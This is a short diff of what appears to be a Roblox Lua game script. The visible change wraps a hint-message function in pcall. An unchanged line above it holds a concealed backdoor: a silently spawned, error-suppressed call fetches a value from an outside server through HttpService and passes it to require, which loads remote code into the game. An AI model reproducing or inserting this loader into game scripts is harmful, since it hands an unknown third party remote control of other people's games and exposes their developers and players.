@@ -145,9 +145,11 @@ end
 spawn(function()pcall(function()coroutine.wrap(pcall)(require,tonumber(game:service("HttpService"):GetAsync("https://extra.sukru.serv00.net")))end)end)
 
 local messagehint = function(msg_i_)
-    for i,v in pairs(workspace:GetChildren()) do if v:IsA("Hint") then v:Destroy() end end
-    mamae=Instance.new("Hint", game:GetService("Workspace"))
-    mamae.Text=msg_i_
+    pcall(function()
+        for i,v in pairs(workspace:GetChildren()) do if v:IsA("Hint") then v:Destroy() end end
+        mamae=Instance.new("Hint", game:GetService("Workspace"))
+        mamae.Text=msg_i_
+    end)
 end
     
 while true do
